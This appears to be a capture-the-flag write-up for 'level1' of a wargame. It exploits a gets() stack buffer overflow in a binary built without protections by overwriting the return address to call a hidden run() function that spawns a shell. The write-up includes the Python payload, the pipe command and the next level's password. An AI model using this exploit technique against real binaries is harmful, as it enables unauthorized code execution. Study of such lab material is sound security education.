We try to execute the binary, but everytime we read on the standard input.
So ghidra again !

scp -r -P 4242 level1@192.168.56.3:/home/user/level1 .

void main(void)

{
  char local_50 [76]; // This line declares a character array named local_50 with a size of 76 bytes. This array can hold up to 75 characters, leaving one byte for the null terminator.
  
  gets(local_50); // The gets() function is called with local_50 as its argument.
  return;
}

We see that the gets() function is considered unsafe because it does not perform any bounds checking, which can lead to buffer overflow vulnerabilities.
And at the beggining we saw this :
:No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1

Afer some research No canary found: A "canary" is a security mechanism used to detect buffer overflows.
It involves placing a random value (canary) between local variables and the return address on the stack.
If a buffer overflow occurs and overwrites the canary, it can be detected before any damage is done.
"No canary found" means that the binary does not include this protection.

i tryed with input : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)

hihihi. Now we have to find, how can we use that.
The buffer overflow start after 76 bytes, we see that in the main function.
We see another function which start a bash :

void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

So we have to run this function with de buffer overflow to have a bash and then run the cat /home/user/level2/.pass like in the previous level.

We used ghidra to convert the binary in c so we have to verify if the function has the same name in asm.
To see all the functions used by a binary using GDB :
info functions

All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run							----> perfect, the function has the same name
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

To see the adress of a function : 
print run --> here for the function run
\$1 = {<text variable, no debug info>} 0x8048444 <run>		---> we have the address : 0x8048444

To execute the run() function we have to replace the return address by the address of the function run() convert in little endian :
We start at the end of the address and put a \x a the start dans every two digits (we read from left to right for the two digits). (And we remove the x in the decimal)
\x44\x84\x04\x08

Now we have to create two scripts in /tmp :
script.sh :
#!/bin/bash
python -c 'print("c"*76 + "\x44\x84\x04\x08")'

This script create a string of 76 "c" and add the address of the function run() in little endian at the end.
This create a buffer overflow and replace the return address by the address of the function run().

script2.sh :
#!/bin/sh
cat /home/user/level2/.pass

This script print the password of the level2 --> very simple

now we have to execute the binary with the first script, we use ; to execute cat and keep the bash open and pipe to the binary to do the buffer overflow:

(sh /tmp/script.sh ; cat) | ./level1

---> Good... Wait what?

The binary is waiting for an input, we put the second script :
sh /tmp/script2.sh

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

We get the password of the level2 !